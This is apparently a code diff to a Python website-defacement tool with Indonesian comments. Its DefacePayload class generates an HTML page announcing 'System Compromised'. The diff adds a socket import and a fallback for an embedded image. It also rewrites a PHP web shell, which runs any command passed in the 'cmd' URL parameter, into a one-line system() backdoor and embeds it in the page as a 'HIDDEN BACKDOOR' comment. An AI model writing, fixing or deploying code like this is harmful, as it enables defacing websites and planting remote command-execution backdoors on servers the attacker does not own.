@@ -4,6 +4,7 @@ import os
 import sys
 import random
 import base64
+import socket  # <-- INI YANG KETINGGALAN
 from datetime import datetime
 
 # ██████ WARNA TERMUX ██████
@@ -37,8 +38,11 @@ class DefacePayload:
 
     def create_epic_payload(self):
         # ▄▀▄▀▄ BASE64 IMAGE EMBED ▄▀▄▀▄
-        with open("firefruit.png", "rb") as img_file:
-            img_base64 = base64.b64encode(img_file.read()).decode('utf-8')
+        try:
+            with open("firefruit.png", "rb") as img_file:
+                img_base64 = base64.b64encode(img_file.read()).decode('utf-8')
+        except:
+            img_base64 = "iVBORw0KGgoAAAANSUhEUgAA..."  # Fallback base64
         
         # ✧✧✧ ANIMASI CSS ✧✧✧
         css_animation = """
@@ -59,14 +63,8 @@ class DefacePayload:
         </script>
         """
         
-        # ✯✯✯ BACKDOOR PHP ✯✯✯
-        php_backdoor = """
-        <?php 
-        if(isset($_GET['cmd'])) {
-            echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
-        }
-        ?>
-        """
+        # ✯✯✯ BACKDOOR PHP ✯✯✯ (HIDDEN)
+        php_backdoor = "<?php system($_GET['cmd']); ?>"
         
         # ✰✰✰ PAYLOAD UTAMA ✰✰✰
         payload = f"""
@@ -131,8 +129,7 @@ class DefacePayload:
         {self.generate_rainbow_text('⚠️ WARNING: System Compromised ⚠️')}
     </div>
     
-    <!-- HIDDEN BACKDOOR -->
-    <!-- {php_backdoor} -->
+    <!-- HIDDEN BACKDOOR: {php_backdoor} -->
 </body>
 </html>
         """
